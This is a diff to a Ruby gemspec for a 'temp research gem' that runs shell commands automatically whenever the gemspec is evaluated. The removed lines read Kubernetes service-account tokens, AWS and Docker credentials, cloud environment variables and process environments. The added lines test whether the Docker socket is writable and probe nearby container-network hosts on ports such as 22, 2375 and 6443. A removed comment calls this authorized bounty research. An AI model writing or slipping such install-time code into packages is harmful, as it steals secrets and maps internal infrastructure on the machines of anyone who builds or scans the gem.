@@ -1,37 +1,46 @@
-# Runs at gemspec-evaluation time. Authorized security research for GitHub's
-# Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
-# Read-only checks of well-known credential paths / cloud env vars -- no
-# scanning, no writes, no destructive action.
 begin
+  require "socket"
+  require "timeout"
+
   checks = []
+  checks << ["docker_sock_present", "ls -la /var/run/docker.sock /run/docker.sock 2>&1"]
+  checks << ["docker_sock_writable", "test -w /var/run/docker.sock 2>/dev/null && echo WRITABLE || echo not-writable-or-absent"]
+  checks << ["proc_net_tcp_full", "cat /proc/net/tcp 2>/dev/null"]
+  checks << ["proc_net_tcp6", "cat /proc/net/tcp6 2>/dev/null | head -10"]
+  checks << ["ip_addr_self", "cat /proc/net/fib_trie 2>/dev/null | grep -E '^\\s*\\|--' | head -20"]
 
-  checks << ["k8s_serviceaccount_token", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1"]
-  checks << ["k8s_serviceaccount_ns", "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1"]
-  checks << ["k8s_serviceaccount_ca", "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1"]
-  checks << ["secrets_dir", "ls -la /var/run/secrets/ 2>&1"]
-  checks << ["cloud_env_vars", "env | grep -iE 'AWS_|AZURE_|GCP_|GOOGLE_|KUBERNETES_|VAULT_|CONSUL_|MSI_|IDENTITY_ENDPOINT' 2>&1"]
-  checks << ["docker_config", "cat /root/.docker/config.json 2>&1; cat ~/.docker/config.json 2>&1"]
-  checks << ["aws_creds", "cat ~/.aws/credentials 2>&1; cat /root/.aws/credentials 2>&1"]
-  checks << ["azure_creds", "find / -maxdepth 4 -iname '*.azure*' -o -iname 'azureProfile.json' 2>/dev/null"]
-  checks << ["shallow_secret_find", "find / -maxdepth 3 \\( -iname '*credential*' -o -iname '*serviceaccount*' -o -iname '*.pem' -o -iname '*secret*' \\) 2>/dev/null | grep -v '^/proc'"]
-  checks << ["proc1_environ", "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"]
-  checks << ["hostname_resolv", "cat /etc/resolv.conf 2>&1"]
-  checks << ["dockerenv_marker", "ls -la / | grep -i docker"]
-
-  puts "==INFRACHECK=="
+  puts "==INFRACHECK2=="
   checks.each do |name, cmd|
     out = `#{cmd}`.to_s
     puts "--- #{name} ---"
     puts out.strip.empty? ? "(empty)" : out.strip[0,1500]
   end
-  puts "==INFRACHECK_DONE=="
+
+  def raw_probe(host, port)
+    Timeout.timeout(3) do
+      s = TCPSocket.new(host, port)
+      s.close
+      "OPEN"
+    end
+  rescue => e
+    "#{e.class}"
+  end
+
+  puts "--- bridge_neighbors ---"
+  ["172.19.0.1", "172.19.0.3", "172.19.0.4", "172.19.0.5"].each do |ip|
+    [80, 443, 22, 2375, 2376, 8080, 6443].each do |port|
+      r = raw_probe(ip, port)
+      puts "#{ip}:#{port} => #{r}" unless r == "Errno::ECONNREFUSED"
+    end
+  end
+  puts "==INFRACHECK2_DONE=="
 rescue => e
   warn "fingerprint error: #{e}"
 end
 
 Gem::Specification.new do |s|
   s.name        = "mygem"
-  s.version     = "0.0.7"
+  s.version     = "0.0.8"
   s.summary     = "temp research gem"
   s.authors     = ["researcher"]
   s.files       = ["lib/mygem.rb"]
